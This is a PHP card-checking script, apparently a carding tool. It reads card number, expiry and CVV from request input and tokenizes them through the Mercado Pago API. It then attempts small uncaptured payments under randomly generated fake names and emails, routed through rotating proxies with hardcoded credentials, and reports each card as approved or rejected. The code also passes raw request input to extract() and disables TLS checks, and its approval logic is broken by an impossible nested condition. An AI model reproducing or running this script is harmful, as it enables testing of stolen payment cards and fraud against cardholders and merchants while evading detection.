<?php
set_time_limit(0);
extract($_REQUEST);

$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];

$nome = ["Kai Lima Castro","Andre Rodrigues Costa","Renan Cavalcanti Barbosa","Thiago Fernandes Ribeiro","Igor Correia Martins","Renan Santos Correia","Diogo Almeida Alves","Matheus Silva Melo"];
$nome_pag = $nome[array_rand($nome)];
$email = strtolower(str_replace(' ', '', $nome_pag)) . rand(00000,99999) . "@outlook.com";
$post = '{"card_number":"'.$cc.'","expiration_month":'.$mes.',"expiration_year":'.$ano.',"security_code":"'.$cvv.'","cardholder":{"name":"MARIO DIAS"}}';
$token = $token;

$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => "https://api.mercadopago.com/v1/card_tokens?access_token=$token",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_SSL_VERIFYPEER => false,
  CURLOPT_SSL_VERIFYHOST => false,
  CURLOPT_PROXY => 'proxy.apify.com:8000',
  CURLOPT_PROXYUSERPWD => 'auto:iffdp2aX9LjhtsFpjzxj4DKjH',
  CURLOPT_ENCODING => "",
  CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_POSTFIELDS => $post,
    CURLOPT_HTTPHEADER => array(
    "content-type: application/json"
  ),
));
$response = curl_exec($curl);
$json = json_decode($response, true);

$id = $json["id"];
$username = 'lum-customer-hl_cc47797a-zone-static';
$password = '1ocg1gd2pgyo';
$port = 22225;

$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';
$ch = curl_init('http://lumtest.com/myip.json');

curl_setopt_array($curl, array(
  CURLOPT_URL => "https://api.mercadopago.com/v1/payments?access_token=$token",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_SSL_VERIFYPEER => false,
  CURLOPT_SSL_VERIFYHOST => false,
  CURLOPT_PROXY =>  "http://$super_proxy:$port",
  CURLOPT_PROXYUSERPWD => "$username-session-$session:$password",
  CURLOPT_ENCODING => "",
  CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_POSTFIELDS => '{"token": "'.$id.'","transaction_amount": 10.00,"payment_method_id": "elo","payer": {"email": "'.$email.'"},"installments": 1,"capture":false}',
  CURLOPT_HTTPHEADER => array(
    "content-type: application/json"
  ),
));
$response = curl_exec($curl);
$json = json_decode($response, true);

$status = $json["status_detail"];

if(!empty($status) && $status == "cc_rejected_bad_filled_security_code"){
if(!empty($status) && $status == "pending_review_manual"){
  echo json_encode(array("status" => 0, "msg" => "#Aprovada $lista [$status]<br>"));
}
}else{
  echo json_encode(array("status" => 1, "msg" => "#Reprovada $lista | [$status]<br>"));
}


